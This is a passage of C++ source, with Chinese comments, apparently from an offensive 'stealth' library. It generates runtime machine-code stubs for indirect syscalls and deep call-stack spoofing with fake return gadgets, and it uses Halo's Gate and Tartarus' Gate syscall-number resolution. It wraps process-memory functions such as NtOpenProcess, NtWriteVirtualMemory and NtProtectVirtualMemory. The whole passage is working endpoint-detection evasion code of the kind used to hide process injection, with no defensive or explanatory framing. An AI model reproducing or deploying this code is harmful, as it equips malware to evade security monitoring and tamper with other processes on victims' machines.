    // pop rax (保存真实返回地址到寄存器)
    codePtr[offset++] = 0x58;

    // push rax (把真实返回地址推到栈底, 在所有伪造帧下方)
    codePtr[offset++] = 0x50;

    // push [rip+disp] x chainCount (推入伪造返回地址)
    // 关键顺序: 先 push 的真实返回地址在最深处,
    // 伪造帧依次叠在上面, 最后一个 push 的在栈顶
    //
    // Push i (0=第一个被 push, 即贴近 real_ret 的那层):
    //   指令位置: offset
    //   RIP at execution: stub_base + offset + 6
    //   数据项 i 位置: dataPtr + i*8
    //   数据项偏移量 (from stub base): totalCodeSize + i*8
    //   disp = (totalCodeSize + i*8) - (offset + 6)
    //
    // 栈上顺序 (从顶到底):
    //   gadget[chainCount-1] ← ret 从这里开始弹出
    //   gadget[chainCount-2]
    //   ...
    //   gadget[0]
    //   real_ret_addr         ← 最终返回到这里
    for (size_t i = 0; i < chainCount; i++) {
        codePtr[offset++] = 0xFF; // push [rip+disp32]
        codePtr[offset++] = 0x35;
        int32_t disp = static_cast<int32_t>(totalCodeSize - offset - 4 + i * 8);
        *reinterpret_cast<int32_t*>(codePtr + offset) = disp;
        offset += 4;
    }

    // mov r10, rcx
    codePtr[offset++] = 0x4C;
    codePtr[offset++] = 0x8B;
    codePtr[offset++] = 0xD1;

    // mov eax, SSN
    codePtr[offset++] = 0xB8;
    *reinterpret_cast<DWORD*>(codePtr + offset) = ssn;
    offset += 4;

    // mov r11, [rip+disp] (加载 syscall gadget 地址)
    // RIP at execution: stub_base + offset + 7
    // syscall gadget 在数据段末尾: dataPtr + chainCount*8
    // disp = (totalCodeSize + chainCount*8) - (offset + 7)
    codePtr[offset++] = 0x4C;
    codePtr[offset++] = 0x8B;
    codePtr[offset++] = 0x1D;
    int32_t syscDisp = static_cast<int32_t>(totalCodeSize + chainCount * 8 - offset - 4);
    *reinterpret_cast<int32_t*>(codePtr + offset) = syscDisp;
    offset += 4;

    // jmp r11
    codePtr[offset++] = 0x41;
    codePtr[offset++] = 0xFF;
    codePtr[offset++] = 0xE3;

    // ---- 数据段 ----
    // 写入 N 个 fake ret gadget 地址
    for (size_t i = 0; i < chainCount; i++) {
        *reinterpret_cast<uintptr_t*>(dataPtr + i * 8) = retGadgets[i];
    }
    // 写入 syscall;ret gadget 地址
    *reinterpret_cast<uintptr_t*>(dataPtr + chainCount * 8) = syscallRetGadget;

    // 分配可执行内存
    void* execMem = VirtualAlloc(nullptr, totalSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!execMem) return nullptr;

    memcpy(execMem, stub.data(), totalSize);

    DWORD oldProtect;
    VirtualProtect(execMem, totalSize, PAGE_EXECUTE_READ, &oldProtect);
    FlushInstructionCache(GetCurrentProcess(), execMem, totalSize);
    return execMem;
}

// 通用 syscall 执行: 选择方法, 生成 stub, 调用
template<typename FnType>
NTSTATUS ExecuteSyscall(const char* funcName, DWORD ssn,
                         SyscallMethod method, FnType&& setupArgs) {
    auto& resolver = SyscallResolver::Instance();
    SyscallMethod actualMethod = DecideMethod(method);

    void* stub = nullptr;

    switch (actualMethod) {
    case SyscallMethod::Indirect: {
        uintptr_t gadget = resolver.GetSyscallRetGadget();
        if (gadget) {
            stub = GenerateIndirectSyscallStub(ssn, gadget);
        }
        break;
    }
    case SyscallMethod::StackSpoof: {
        uintptr_t gadget = resolver.GetSyscallRetGadget();
        auto retGadgets = GetRetGadgets(32);
        auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext();
        if (gadget && !retGadgets.empty()) {
            stub = GenerateDeepSpoofStub(ssn, gadget, retGadgets, spoofCtx);
        }
        break;
    }
    default:
        break;
    }

    // 降级: 如果高级方法失败, 回退到直接 syscall
    if (!stub) {
        stub = TartarusGate::GenerateSyscallStub(ssn);
    }

    using SyscallFn = NTSTATUS(NTAPI*)(...);

    if (!stub) {
        // 最终回退: 使用 ntdll 中的原版函数
        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        auto fn = reinterpret_cast<FARPROC>(GetProcAddress(ntdll, funcName));
        if (!fn) return STATUS_NOT_SUPPORTED;
        return setupArgs(reinterpret_cast<SyscallFn>(fn));
    }

    return setupArgs(reinterpret_cast<SyscallFn>(stub));
}

} // anonymous namespace

// ============================================================
// 公开的 Syscall API 实现
// ============================================================

#define DEFINE_SYSCALL_WITH_METHOD(name, ntdllFn, ssnField, retType, ...) \
NTSTATUS name(__VA_ARGS__, SyscallMethod method) { \
    auto& resolver = SyscallResolver::Instance(); \
    DWORD ssn = resolver.GetNumbers().ssnField; \
    if (!ssn) { \
        resolver.InitializeHaloGate(); \
        ssn = resolver.GetNumbers().ssnField; \
    } \
    if (!ssn) { \
        /* 最终回退: 调用原始 ntdll 导出函数 */ \
        using Fn_t = NTSTATUS(NTAPI*)(__VA_ARGS__); \
        static auto fn = reinterpret_cast<Fn_t>( \
            GetProcAddress(GetModuleHandleW(L"ntdll.dll"), ntdllFn)); \
        if (fn) return fn(__VA_ARGS__); \
        return STATUS_NOT_SUPPORTED; \
    } \
    SyscallMethod m = DecideMethod(method); \
    void* stub = nullptr; \
    if (m == SyscallMethod::StackSpoof) { \
        uintptr_t gadget = resolver.GetSyscallRetGadget(); \
        auto retGadgets = GetRetGadgets(32); \
        auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext(); \
        if (gadget && !retGadgets.empty()) { \
            stub = GenerateDeepSpoofStub(ssn, gadget, retGadgets, spoofCtx); \
        } \
    } \
    if (!stub && (m == SyscallMethod::Indirect)) { \
        uintptr_t gadget = resolver.GetSyscallRetGadget(); \
        stub = gadget ? GenerateIndirectSyscallStub(ssn, gadget) : nullptr; \
    } \
    if (!stub) stub = TartarusGate::GenerateSyscallStub(ssn); \
    if (!stub) { \
        using Fn_t = NTSTATUS(NTAPI*)(__VA_ARGS__); \
        static auto fn = reinterpret_cast<Fn_t>( \
            GetProcAddress(GetModuleHandleW(L"ntdll.dll"), ntdllFn)); \
        if (fn) return fn(__VA_ARGS__); \
        return STATUS_NOT_SUPPORTED; \
    } \
    using Fn_t = NTSTATUS(NTAPI*)(__VA_ARGS__); \
    auto fn = reinterpret_cast<Fn_t>(stub); \
    return fn(__VA_ARGS__); \
}

// 使用宏避免代码膨胀, 但为可读性, 手动展开

// ---- SysAllocateVirtualMemory ----
NTSTATUS SysAllocateVirtualMemory(
    HANDLE hProcess, PVOID* baseAddr, ULONG_PTR zeroBits,
    PSIZE_T regionSize, ULONG allocType, ULONG protect,
    SyscallMethod method)
{
    auto& resolver = SyscallResolver::Instance();
    DWORD ssn = resolver.GetNumbers().NtAllocateVirtualMemory;
    if (!ssn) { resolver.InitializeHaloGate(); ssn = resolver.GetNumbers().NtAllocateVirtualMemory; }

    SyscallMethod m = DecideMethod(method);
    void* stub = nullptr;
    if (m == SyscallMethod::StackSpoof) {
        uintptr_t gadget = resolver.GetSyscallRetGadget();
        auto retGadgets = GetRetGadgets(32);
        auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext();
        if (gadget && !retGadgets.empty()) {
            stub = GenerateDeepSpoofStub(ssn, gadget, retGadgets, spoofCtx);
        }
    }
    if (!stub && m == SyscallMethod::Indirect) {
        stub = GenerateIndirectSyscallStub(ssn, resolver.GetSyscallRetGadget());
    }
    if (!stub) stub = TartarusGate::GenerateSyscallStub(ssn);
    if (!stub) {
        using Fn = NTSTATUS(NTAPI*)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
        auto fn = reinterpret_cast<Fn>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtAllocateVirtualMemory"));
        return fn ? fn(hProcess, baseAddr, zeroBits, regionSize, allocType, protect) : STATUS_NOT_SUPPORTED;
    }
    using Fn = NTSTATUS(NTAPI*)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    return reinterpret_cast<Fn>(stub)(hProcess, baseAddr, zeroBits, regionSize, allocType, protect);
}

// ---- SysProtectVirtualMemory ----
NTSTATUS SysProtectVirtualMemory(
    HANDLE hProcess, PVOID* baseAddr, PSIZE_T regionSize,
    ULONG newProtect, PULONG oldProtect, SyscallMethod method)
{
    auto& resolver = SyscallResolver::Instance();
    DWORD ssn = resolver.GetNumbers().NtProtectVirtualMemory;
    if (!ssn) { resolver.InitializeHaloGate(); ssn = resolver.GetNumbers().NtProtectVirtualMemory; }

    SyscallMethod m = DecideMethod(method);
    void* stub = nullptr;
    if (m == SyscallMethod::StackSpoof) {
        uintptr_t gadget = resolver.GetSyscallRetGadget();
        auto retGadgets = GetRetGadgets(32);
        auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext();
        if (gadget && !retGadgets.empty()) {
            stub = GenerateDeepSpoofStub(ssn, gadget, retGadgets, spoofCtx);
        }
    }
    if (!stub && m == SyscallMethod::Indirect) {
        stub = GenerateIndirectSyscallStub(ssn, resolver.GetSyscallRetGadget());
    }
    if (!stub) stub = TartarusGate::GenerateSyscallStub(ssn);
    if (!stub) {
        using Fn = NTSTATUS(NTAPI*)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
        auto fn = reinterpret_cast<Fn>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtProtectVirtualMemory"));
        return fn ? fn(hProcess, baseAddr, regionSize, newProtect, oldProtect) : STATUS_NOT_SUPPORTED;
    }
    using Fn = NTSTATUS(NTAPI*)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
    return reinterpret_cast<Fn>(stub)(hProcess, baseAddr, regionSize, newProtect, oldProtect);
}

// ---- SysWriteVirtualMemory ----
NTSTATUS SysWriteVirtualMemory(
    HANDLE hProcess, PVOID baseAddr, PVOID buffer,
    SIZE_T bytesToWrite, PSIZE_T bytesWritten, SyscallMethod method)
{
    auto& resolver = SyscallResolver::Instance();
    DWORD ssn = resolver.GetNumbers().NtWriteVirtualMemory;
    if (!ssn) { resolver.InitializeHaloGate(); ssn = resolver.GetNumbers().NtWriteVirtualMemory; }

    SyscallMethod m = DecideMethod(method);
    void* stub = nullptr;
    if (m == SyscallMethod::StackSpoof) {
        uintptr_t gadget = resolver.GetSyscallRetGadget();
        auto retGadgets = GetRetGadgets(32);
        auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext();
        if (gadget && !retGadgets.empty()) {
            stub = GenerateDeepSpoofStub(ssn, gadget, retGadgets, spoofCtx);
        }
    }
    if (!stub && m == SyscallMethod::Indirect) {
        stub = GenerateIndirectSyscallStub(ssn, resolver.GetSyscallRetGadget());
    }
    if (!stub) stub = TartarusGate::GenerateSyscallStub(ssn);
    if (!stub) {
        using Fn = NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
        auto fn = reinterpret_cast<Fn>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtWriteVirtualMemory"));
        return fn ? fn(hProcess, baseAddr, buffer, bytesToWrite, bytesWritten) : STATUS_NOT_SUPPORTED;
    }
    using Fn = NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    return reinterpret_cast<Fn>(stub)(hProcess, baseAddr, buffer, bytesToWrite, bytesWritten);
}

// ---- SysReadVirtualMemory ----
NTSTATUS SysReadVirtualMemory(
    HANDLE hProcess, PVOID baseAddr, PVOID buffer,
    SIZE_T bytesToRead, PSIZE_T bytesRead, SyscallMethod method)
{
    auto& resolver = SyscallResolver::Instance();
    DWORD ssn = resolver.GetNumbers().NtReadVirtualMemory;
    if (!ssn) { resolver.InitializeHaloGate(); ssn = resolver.GetNumbers().NtReadVirtualMemory; }

    SyscallMethod m = DecideMethod(method);
    void* stub = nullptr;
    if (m == SyscallMethod::StackSpoof) {
        uintptr_t gadget = resolver.GetSyscallRetGadget();
        auto retGadgets = GetRetGadgets(32);
        auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext();
        if (gadget && !retGadgets.empty()) {
            stub = GenerateDeepSpoofStub(ssn, gadget, retGadgets, spoofCtx);
        }
    }
    if (!stub && m == SyscallMethod::Indirect) {
        stub = GenerateIndirectSyscallStub(ssn, resolver.GetSyscallRetGadget());
    }
    if (!stub) stub = TartarusGate::GenerateSyscallStub(ssn);
    if (!stub) {
        using Fn = NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
        auto fn = reinterpret_cast<Fn>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtReadVirtualMemory"));
        return fn ? fn(hProcess, baseAddr, buffer, bytesToRead, bytesRead) : STATUS_NOT_SUPPORTED;
    }
    using Fn = NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    return reinterpret_cast<Fn>(stub)(hProcess, baseAddr, buffer, bytesToRead, bytesRead);
}

// ---- SysOpenProcess ----
NTSTATUS SysOpenProcess(
    PHANDLE hProcess, ACCESS_MASK desiredAccess,
    POBJECT_ATTRIBUTES objAttr, PCLIENT_ID clientId, SyscallMethod method)
{
    auto& resolver = SyscallResolver::Instance();
    DWORD ssn = resolver.GetNumbers().NtOpenProcess;
    if (!ssn) { resolver.InitializeHaloGate(); ssn = resolver.GetNumbers().NtOpenProcess; }

    SyscallMethod m = DecideMethod(method);
    void* stub = nullptr;
    if (m == SyscallMethod::StackSpoof) {
        uintptr_t gadget = resolver.GetSyscallRetGadget();
        auto retGadgets = GetRetGadgets(32);
        auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext();
        if (gadget && !retGadgets.empty()) {
            stub = GenerateDeepSpoofStub(ssn, gadget, retGadgets, spoofCtx);
        }
    }
    if (!stub && m == SyscallMethod::Indirect) {
        stub = GenerateIndirectSyscallStub(ssn, resolver.GetSyscallRetGadget());
    }
    if (!stub) stub = TartarusGate::GenerateSyscallStub(ssn);
    if (!stub) {
        using Fn = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
        auto fn = reinterpret_cast<Fn>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtOpenProcess"));
        return fn ? fn(hProcess, desiredAccess, objAttr, clientId) : STATUS_NOT_SUPPORTED;
    }
    using Fn = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
    return reinterpret_cast<Fn>(stub)(hProcess, desiredAccess, objAttr, clientId);
}

// ---- SysQuerySystemInformation ----
NTSTATUS SysQuerySystemInformation(
    ULONG infoClass, PVOID info, ULONG infoLen,
    PULONG returnLen, SyscallMethod method)
{
    auto& resolver = SyscallResolver::Instance();
    DWORD ssn = resolver.GetNumbers().NtQuerySystemInformation;
    if (!ssn) { resolver.InitializeHaloGate(); ssn = resolver.GetNumbers().NtQuerySystemInformation; }

    SyscallMethod m = DecideMethod(method);
    void* stub = nullptr;
    if (m == SyscallMethod::StackSpoof) {
        uintptr_t gadget = resolver.GetSyscallRetGadget();
        auto retGadgets = GetRetGadgets(32);
        auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext();
        if (gadget && !retGadgets.empty()) {
            stub = GenerateDeepSpoofStub(ssn, gadget, retGadgets, spoofCtx);
        }
    }
    if (!stub && m == SyscallMethod::Indirect) {
        stub = GenerateIndirectSyscallStub(ssn, resolver.GetSyscallRetGadget());
    }
    if (!stub) stub = TartarusGate::GenerateSyscallStub(ssn);
    if (!stub) {
        using Fn = NTSTATUS(NTAPI*)(ULONG, PVOID, ULONG, PULONG);
        auto fn = reinterpret_cast<Fn>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation"));
        return fn ? fn(infoClass, info, infoLen, returnLen) : STATUS_NOT_SUPPORTED;
    }
    using Fn = NTSTATUS(NTAPI*)(ULONG, PVOID, ULONG, PULONG);
    return reinterpret_cast<Fn>(stub)(infoClass, info, infoLen, returnLen);
}

// ---- SysQueryInformationProcess ----
NTSTATUS SysQueryInformationProcess(
    HANDLE hProcess, ULONG infoClass, PVOID info,
    ULONG infoLen, PULONG returnLen, SyscallMethod method)
{
    auto& resolver = SyscallResolver::Instance();
    DWORD ssn = resolver.GetNumbers().NtQueryInformationProcess;
    if (!ssn) { resolver.InitializeHaloGate(); ssn = resolver.GetNumbers().NtQueryInformationProcess; }

    SyscallMethod m = DecideMethod(method);
    void* stub = nullptr;
    if (m == SyscallMethod::StackSpoof) {
        uintptr_t gadget = resolver.GetSyscallRetGadget();
        auto retGadgets = GetRetGadgets(32);
        auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext();
        if (gadget && !retGadgets.empty()) {
            stub = GenerateDeepSpoofStub(ssn, gadget, retGadgets, spoofCtx);
        }
    }
    if (!stub && m == SyscallMethod::Indirect) {
        stub = GenerateIndirectSyscallStub(ssn, resolver.GetSyscallRetGadget());
    }
    if (!stub) stub = TartarusGate::GenerateSyscallStub(ssn);
    if (!stub) {
        using Fn = NTSTATUS(NTAPI*)(HANDLE, ULONG, PVOID, ULONG, PULONG);
        auto fn = reinterpret_cast<Fn>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess"));
        return fn ? fn(hProcess, infoClass, info, infoLen, returnLen) : STATUS_NOT_SUPPORTED;
    }
    using Fn = NTSTATUS(NTAPI*)(HANDLE, ULONG, PVOID, ULONG, PULONG);
    return reinterpret_cast<Fn>(stub)(hProcess, infoClass, info, infoLen, returnLen);
}

// ---- SysClose ----
NTSTATUS SysClose(HANDLE handle, SyscallMethod method) {
    auto& resolver = SyscallResolver::Instance();
    DWORD ssn = resolver.GetNumbers().NtClose;
    if (!ssn) { resolver.InitializeHaloGate(); ssn = resolver.GetNumbers().NtClose; }

    SyscallMethod m = DecideMethod(method);
    void* stub = nullptr;
    if (m == SyscallMethod::StackSpoof) {
        uintptr_t gadget = resolver.GetSyscallRetGadget();
        auto retGadgets = GetRetGadgets(32);
        auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext();
        if (gadget && !retGadgets.empty()) {
            stub = GenerateDeepSpoofStub(ssn, gadget, retGadgets, spoofCtx);
        }
    }
    if (!stub && m == SyscallMethod::Indirect) {
        stub = GenerateIndirectSyscallStub(ssn, resolver.GetSyscallRetGadget());
    }
    if (!stub) stub = TartarusGate::GenerateSyscallStub(ssn);
    if (!stub) {
        using Fn = NTSTATUS(NTAPI*)(HANDLE);
        auto fn = reinterpret_cast<Fn>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtClose"));
        return fn ? fn(handle) : STATUS_NOT_SUPPORTED;
    }
    using Fn = NTSTATUS(NTAPI*)(HANDLE);
    return reinterpret_cast<Fn>(stub)(handle);
}

} // namespace stealth
